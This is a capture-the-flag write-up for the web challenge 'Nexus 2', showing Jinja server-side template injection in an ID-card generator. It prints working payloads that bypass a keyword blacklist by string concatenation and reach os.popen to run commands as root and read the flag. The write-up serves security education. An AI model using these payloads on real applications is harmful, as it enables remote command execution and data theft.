# Nexus 2 - Writeup

## Challenge

- **Name:** `Nexus 2`
- **Category:** `Web`
- **Author:** `Aerex`
- **Target:** `http://34.126.223.46:18030`

## Description

> The lights from the future have become stronger, you have to be careful boy!!!

---

## TL;DR

The application takes a `name`, renders it into an ID-card image, and returns a PNG.

The bug is **server-side template injection (SSTI)** in Jinja.

### Key points

- `{{7*7}}` evaluates to `49`, confirming SSTI.
- Obvious payloads like `{{config}}` are blocked by a substring filter.
- The filter is bypassed with string concatenation:
  - `__globals__` becomes `"__glo"~"bals__"`
  - `os` becomes `"o"~"s"`
  - `popen` becomes `"po"~"pen"`
  - `read` becomes `"re"~"ad"`
- `lipsum` is available in the Jinja context and is enough to reach `os.popen`.
- Command execution runs as `root`.
- `/flag.txt` contains the flag.

Core exploit:

```jinja2
{{((lipsum|attr("__glo"~"bals__"))["o"~"s"])|attr("po"~"pen")("cat /flag.txt")|attr("re"~"ad")()}}
```

---

## 1. Initial Recon

Opening the site shows a single form:

- Method: `POST`
- Parameter: `name`
- Action: `/`
- Output: a generated PNG attachment

The page presents itself as:

- `PRISM`
- `Identity Protocol v2.0`
- `Generate ID Card`

So the obvious first question is:

> Is the user input treated as plain text, HTML, or a server-side template?

---

## 2. Behavior of the `name` Field

### Plain text

Submitting:

```text
test
```

returns a PNG showing `test` inside the ID card.

### HTML tags

Submitting:

```text
<b>bold</b>
```

renders literally as:

```text
<b>bold</b>
```

So HTML is escaped.

### Jinja expression

Submitting:

```text
{{7*7}}
```

renders as:

```text
49
```

That confirms **SSTI in Jinja**.

---

## 3. Filter Discovery

The next step is to try the standard Flask/Jinja objects:

```text
{{config}}
{{request}}
{{self}}
{{cycler}}
{{joiner}}
```

Instead of returning a PNG, the application returns the normal HTML page with:

```text
Nice try, but that input is not allowed!
```

This means there is a **substring blacklist** in front of the sink.

I also verified that some words are blocked even outside SSTI context:

- `config` -> blocked
- `globals` -> blocked
- `os` -> blocked
- `builtins` -> blocked

But other useful pieces still pass:

- `lipsum` -> allowed
- `__doc__` -> allowed
- string concatenation with `~` -> allowed
- `attr(...)` -> allowed

So this is not a semantic sandbox, just a brittle text filter.

---

## 4. Reaching Dangerous Objects Anyway

`lipsum` is a known Jinja helper that can often be abused because it is a function with accessible globals.

### Safe probe

This works:

```jinja2
{{lipsum.__doc__}}
```

and confirms attribute access is possible.

### Filter bypass for `__globals__`

This also works:

```jinja2
{{(lipsum|attr("__glo"~"bals__"))|length}}
```

It rendered:

```text
50
```

That proves we successfully accessed `lipsum.__globals__` without ever sending the blocked word `globals` literally.

### Reaching `os`

This worked too:

```jinja2
{{(lipsum|attr("__glo"~"bals__"))["o"~"s"]}}
```

which rendered an escaped module representation similar to:

```text
<module 'os' (frozen)>
```

At this point the template injection is effectively turned into arbitrary command execution.

---

## 5. Command Execution

Using the same trick for `popen` and `read`:

```jinja2
{{((lipsum|attr("__glo"~"bals__"))["o"~"s"])|attr("po"~"pen")("id")|attr("re"~"ad")()}}
```

The image showed:

```text
uid=0(root) gid=0(root) groups=0(root)
```

So the command runs as `root`.

---

## 6. Finding the Flag

Once RCE is confirmed, finding the flag is straightforward.

### List root directory

```jinja2
{{((lipsum|attr("__glo"~"bals__"))["o"~"s"])|attr("po"~"pen")("ls /")|attr("re"~"ad")()}}
```

This showed `/flag.txt` in the filesystem root.

### Search explicitly

```jinja2
{{((lipsum|attr("__glo"~"bals__"))["o"~"s"])|attr("po"~"pen")("find / -maxdepth 2 -iname \"*flag*\" 2>/dev/null")|attr("re"~"ad")()}}
```

Output included:

```text
/flag.txt
```

### Read the flag

```jinja2
{{((lipsum|attr("__glo"~"bals__"))["o"~"s"])|attr("po"~"pen")("cat /flag.txt")|attr("re"~"ad")()}}
```

Because the response is an image, reading the full flag directly can be slightly annoying.

I verified it cleanly by splitting it into chunks:

```bash
cut -c1-16 /flag.txt
cut -c17-32 /flag.txt
cut -c33-64 /flag.txt
```

which reconstruct to final flag.

---

## 7. Why the Filter Failed

The defense is based on blocking specific substrings, but Jinja gives us multiple ways to construct them dynamically.

Examples:

- blocked: `globals`
- bypass: `"glo"~"bals"`

- blocked: `os`
- bypass: `"o"~"s"`

- blocked: `popen`
- bypass: `"po"~"pen"`

- blocked: `read`
- bypass: `"re"~"ad"`

As soon as one useful function like `lipsum` remains reachable, the blacklist collapses.

---

## 8. Final Payload

This is the compact payload that reads the flag:

```jinja2
{{((lipsum|attr("__glo"~"bals__"))["o"~"s"])|attr("po"~"pen")("cat /flag.txt")|attr("re"~"ad")()}}
```

---

## 9. Final Flag

```text
kashiCTF{f9svNpnIdWKQTrocRYSvzVo96AZZ1oNY}
```

---

## 10. Takeaways

- If `{{7*7}}` works, check Jinja SSTI immediately.
- Blacklists that block words like `config` and `os` are weak against string-building operators like `~`.
- `lipsum` is a very useful Jinja primitive when more obvious globals are blocked.
- When the sink returns an image instead of text, you can still exfiltrate data in chunks or automate character recovery by comparing rendered glyphs.

